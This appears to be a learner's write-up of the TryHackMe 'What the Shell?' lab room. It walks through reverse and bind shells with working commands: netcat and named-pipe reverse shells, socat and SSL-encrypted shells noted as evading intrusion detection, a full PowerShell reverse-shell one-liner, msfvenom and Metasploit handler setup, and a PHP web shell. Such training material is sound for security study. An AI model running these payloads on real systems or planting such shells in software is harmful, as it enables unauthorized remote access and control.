# 🐚 TryHackMe: What the Shell?


## 🐚 Task 1: What is a Shell?

Before we can get into the intricacies of sending and receiving shells, it's important to understand what a shell actually is.

In the simplest possible terms, **shells** are what we use when interfacing with a Command Line environment (CLI).  
- In **Linux**, common shells include `bash`, `sh`, and `zsh`.  
- In **Windows**, we use `cmd.exe` and `PowerShell`.

---

### 🎯 Why do we need shells in hacking?

When targeting remote systems, it's often possible to force an application (like a webserver) to execute arbitrary code. When this happens, the goal is to obtain a shell on the target system.

This can be done in two main ways:
- **Reverse Shell**: The target connects back to the attacker's machine to provide shell access.
- **Bind Shell**: The target opens a port, and the attacker connects to it.

---

### 📋 What will this room cover?

- This room explains reverse and bind shells in detail.
- Screenshots and code blocks are provided to illustrate key concepts.
- Two virtual machines (Linux and Windows) are available in Tasks 14 and 15 for hands-on practice.
- Practice exercises are available in Task 13.

> Without further ado, let’s begin!


## 🛠 Task 2: Tools

This task introduces tools like Netcat, Socat, Metasploit multi/handler, and Msfvenom for shell interaction.


## 🔁 Task 3: Types of Shells

At a high level, we are interested in two kinds of shell when it comes to exploiting a target:

- **Reverse Shells**: The target connects back to the attacker's machine.
- **Bind Shells**: The target listens, and the attacker connects in.

---

### 🔄 Reverse Shell Example

The attacking machine sets up a listener:
```bash
sudo nc -lvnp 443
```

The target machine sends a shell:
```bash
nc <attacker-ip> 443 -e /bin/bash
```

#### 📸 Screenshot: Reverse Shell from Linux Target
![Reverse Shell - Linux](https://github.com/user-attachments/assets/49ad827a-8a18-4426-97fe-541e76259af8)

---

### 📡 Bind Shell Example

Target (e.g., Windows) listens:
```cmd
nc -lvnp 8080 -e "cmd.exe"
```

Attacker connects:
```bash
nc <target-ip> 8080
```

#### 📸 Screenshot: Bind Shell from Windows Target using Evil-WinRM
![Bind Shell - Windows](https://github.com/user-attachments/assets/097edb3c-f730-418c-9f80-052b79d690af)

---

### 🧠 Interactive vs Non-Interactive Shells

- **Interactive Shells**: Allow full CLI interaction (e.g., ssh).
- **Non-Interactive Shells**: Limited functionality, often seen in basic reverse/bind shells.

Example: Running SSH in non-interactive shell fails to show prompt.

#### 📸 Screenshot: SSH Prompt Showing Interactivity
![SSH Interactive Example](https://github.com/user-attachments/assets/9a6439af-f3ed-4862-a9e4-462eb3959791)

---

### 🧪 Custom Listener Demonstration

A shell received through a custom alias (`listener`) shows limited interactivity but works for basic commands.

#### 📸 Screenshot: Listener Command and Connection Output
![Listener Output](https://github.com/user-attachments/assets/ec143693-c13c-46f7-ae21-22767297f8d7)

---

This task illustrates the difference between shell types and the importance of stability and interactivity when working with reverse/bind shells.


## 📡 Task 4: Netcat

Covers listener setup (`nc -lvnp`) and connection behavior for reverse and bind shells.


## ⚙️ Task 5: Netcat Shell Stabilization

Once you receive a reverse shell via Netcat, it is usually unstable and non-interactive. Here are three techniques to stabilize the shell for better usability.

---

### 🧪 Technique 1: Python pty Spawn

This command spawns a pseudo-terminal for better formatting:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then, export terminal settings:
```bash
export TERM=xterm
```

Next, suspend the shell with `Ctrl + Z` and run:
```bash
stty raw -echo; fg
```

Now you’ll have arrow key support, tab completion, and better behavior with interactive tools.

#### 📸 Screenshot: Python Shell Stabilization Process
![Python pty Shell Stabilization](https://github.com/user-attachments/assets/6106f4b9-8edf-4cbc-b816-c59cd3c84ff6)

---

### 💡 Bonus: Resize Terminal (stty)

To use interactive programs like text editors, your shell must have accurate dimensions.

Get your terminal's current size:
```bash
stty -a
```

Note the rows and columns.

#### 📸 Screenshot: Getting Terminal Size with stty
![stty -a Output](https://github.com/user-attachments/assets/8513aaac-89f4-4f6a-87ea-c00df232a6c3)

Then set them in your shell:
```bash
stty rows <num> cols <num>
```

---

### 🧰 Other Techniques Covered

- **rlwrap**: Improves interaction using:
  ```bash
  rlwrap nc -lvnp 443
  ```

- **Socat**: Use it to spawn a full TTY shell by transferring the binary and executing:
  ```bash
  socat TCP:<attacker-ip>:<port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
  ```

Each technique offers different benefits depending on the environment and OS. Practice all three to become comfortable stabilizing any basic reverse shell.



## 🔄 Task 6: Socat

Socat is a powerful tool for creating reverse and bind shells with enhanced stability. It can connect two data streams, such as a port and a terminal.

---

### 🔁 Reverse Shell Example

**Listener (attacker):**
```bash
socat TCP-L:<port> -
```

**Target (Linux):**
```bash
socat TCP:<attacker-ip>:<port> EXEC:"bash -li"
```

**Target (Windows):**
```bash
socat TCP:<attacker-ip>:<port> EXEC:powershell.exe,pipes
```

---

### 🔗 Bind Shell Example

**Target (Linux):**
```bash
socat TCP-L:<port> EXEC:"bash -li"
```

**Attacker:**
```bash
socat TCP:<target-ip>:<port> -
```

---

### 🧰 Fully Interactive TTY with Socat

To spawn a fully interactive shell immediately:

**Attacker:**
```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

**Target:**
```bash
socat TCP:<attacker-ip>:<port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

This provides a more stable shell with:
- `pty`: Pseudo-terminal
- `stderr`: Shows error output
- `sigint`: Allows Ctrl+C in shell
- `setsid`: Creates a new session
- `sane`: Normalizes terminal behavior

#### 📸 Screenshot: Fully Interactive Socat Shell
![Socat Full TTY Shell](https://github.com/user-attachments/assets/b08bca04-ff2f-4864-b56a-6606ba6bebf8)

---

Practice this setup to gain hands-on experience with stable shells using socat and different shell environments.



## 🔐 Task 7: Socat Encrypted Shells

Socat supports encrypted reverse and bind shells using SSL certificates, adding security and potentially bypassing IDS.

---

### 📜 Step-by-Step: Creating Encrypted Shells

1. **Generate a certificate and private key:**
```bash
openssl req --newkey rsa:2048 -nodes -keyout encrypt.key -x509 -days 362 -out encrypt.crt
```

2. **Combine key and certificate:**
```bash
cat encrypt.key encrypt.crt > encrypt.pem
```

3. **Start encrypted listener (attacker):**
```bash
sudo socat OPENSSL-LISTEN:<port>,cert=encrypt.pem,verify=0 -
```

4. **Connect back from the target:**
```bash
socat OPENSSL:<attacker-ip>:<port>,verify=0 EXEC:/bin/bash
```

---

### ✅ Why Encrypt?

- Prevents interception or eavesdropping
- Can evade some network intrusion detection systems
- Looks like standard encrypted traffic

---

#### 📸 Screenshot: Encrypted Socat Reverse Shell Demonstration
![Encrypted Shell via Socat](https://github.com/user-attachments/assets/a36c19b1-53c3-47d0-9520-9dee033630ff)

---

Use this setup when stealth or secure communication channels are required. Just remember, the certificate must be used on the listening side (attacker or target, depending on shell direction).



## 📦 Task 8: Common Shell Payloads

This task explores common methods to establish reverse and bind shells using netcat and PowerShell.

---

### 🧱 Netcat Bind Shell with Named Pipe

Use this command when `-e` is not supported by netcat:
```bash
mkfifo /tmp/f; nc -lvnp 8080 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
```

#### 📸 Screenshot: Netcat Bind Shell via Named Pipe
![Bind Shell Named Pipe](https://github.com/user-attachments/assets/c81629cf-d704-491b-9755-7c2ba27f1f4a)

---

### 🔁 Netcat Reverse Shell using Named Pipe

Similar to the bind version, this creates a reverse shell:
```bash
mkfifo /tmp/f; nc <attacker-ip> <port> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
```

#### 📸 Screenshot: Netcat Reverse Shell via Named Pipe
![Reverse Shell Named Pipe](https://github.com/user-attachments/assets/0348384c-7378-4d3a-b475-cf0412adcdce)

---

### 💻 PowerShell One-liner Reverse Shell

Use this payload on modern Windows systems:
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### 📸 Screenshot: PowerShell Reverse Shell in Action
![PowerShell Reverse Shell](https://github.com/user-attachments/assets/72cd4332-d37e-43ae-aeaa-e7ce19a8cc08)

---

These payloads are versatile and widely used in CTFs and penetration testing. Ensure your environment supports the needed flags or fallback methods like named pipes and PowerShell.



## 💥 Task 9: msfvenom

Msfvenom is a powerful tool in the Metasploit framework used to generate shell payloads.

---

### 🔧 Common Usage

Generate a reverse shell EXE for Windows:
```bash
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<IP> LPORT=<PORT>
```

- `-p`: Specifies the payload
- `-f`: Output format (e.g., `exe`, `py`, `elf`, `raw`)
- `-o`: Output file name
- `LHOST` / `LPORT`: Listener host and port

#### 📸 Screenshot: Generating Payload with msfvenom
![msfvenom reverse_tcp EXE](https://github.com/user-attachments/assets/0160d655-2dcc-4b31-b92e-2f6a755eb315)

---

### 🧬 Listing Payloads

To list available payloads:
```bash
msfvenom --list payloads | grep "linux/x86/meterpreter"
```

- This shows both staged and stageless payloads.
- Use `grep` to filter by platform, architecture, or type.

#### 📸 Screenshot: Meterpreter Payload Options
![msfvenom Payload List](https://github.com/user-attachments/assets/5f10bbbf-f265-4371-8d73-3842252ae189)

---

### 🔍 Naming Conventions

- **Staged payloads**: use `/`
  - e.g., `windows/x64/meterpreter/reverse_tcp`
- **Stageless payloads**: use `_`
  - e.g., `linux/x86/meterpreter_reverse_tcp`

Understanding this syntax is essential for accurate payload creation and delivery.



## 📡 Task 10: Metasploit multi/handler

The Metasploit `multi/handler` module is used to catch reverse shells—especially staged ones like Meterpreter.

---

### 🧭 Starting the Handler

1. Launch Metasploit:
```bash
sudo msfconsole -q
```

2. Use the handler module:
```bash
use exploit/multi/handler
```

3. Set the payload, LHOST, and LPORT:
```bash
set PAYLOAD windows/x64/shell/reverse_tcp
set LHOST 10.11.12.223
set LPORT 443
```

#### 📸 Screenshot: Handler Setup in Metasploit
![multi/handler setup](https://github.com/user-attachments/assets/70ae0a6b-151a-465d-ac61-a9fb83f50fb1)

---

### 🚀 Running the Listener

Start the listener in background mode:
```bash
exploit -j
```

- `-j` runs it as a background job.

#### 📸 Screenshot: Starting the Handler
![Handler Execution](https://github.com/user-attachments/assets/a9637113-4182-4bf2-9bda-76655820c7e3)

---

### 🖥 Session Management

When a shell connects back:
```bash
sessions
sessions 1
```

#### 📸 Screenshot: Shell Session Opened and Interacted
![Reverse Shell Session](https://github.com/user-attachments/assets/4029cc97-e31b-40c5-a281-5b8743bc1329)

---

Metasploit’s handler makes working with staged payloads and Meterpreter shells much easier, offering full session management and automation.



## 🌐 Task 11: Web Shells

Sometimes a target allows file uploads or has vulnerable endpoints that permit code execution. In such cases, web shells can be used for command execution.

---

### 🧩 What is a Web Shell?

A web shell is a script (usually in PHP, ASP, or JSP) that allows remote command execution on a web server through a browser interface.

Example of a simple PHP web shell:
```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

By accessing the script like this:
```
http://<target-ip>/shell.php?cmd=whoami
```
…you can remotely execute shell commands.

---

### 📁 Web Shell Locations in Kali

Kali includes web shells by default:
```bash
/usr/share/webshells
```

Popular shells:
- `php-reverse-shell.php` (by PentestMonkey)
- ASP/JSP alternatives for Windows IIS or Tomcat

---

### 🔄 Windows-Specific Payloads

On Windows, PowerShell is often used for remote code execution when uploading web shells is possible. This can include:
- URL encoded PowerShell payloads
- MSFVenom generated `.aspx` shells

---

#### 📸 Screenshot: Web Shell Access and Execution
![Web Shell PHP ifconfig](https://github.com/user-attachments/assets/08cec391-c099-443e-935c-3747f96ccc58)

The above shows `ifconfig` output from the target using a GET request to a PHP shell.

---

Web shells are a great way to gain initial access or pivot to a more stable reverse shell. Always aim to escalate access or spawn a fully interactive shell after gaining RCE.


## ⏭ Task 12: Next Steps

Discusses escalation paths post-shell, including finding SSH keys, registry credentials, and adding users.

## 💻 Task 13: Practice and Examples

Two sandbox machines (Linux and Windows) are provided for shell practice.

## 🧪 Task 14: Linux Practice Box

Use SSH with credentials (shell / TryH4ckM3!) to test Netcat and Socat shells.

## 🧪 Task 15: Windows Practice Box

Login via RDP with Administrator / TryH4ckM3! to test PowerShell and `.exe` payload shells.

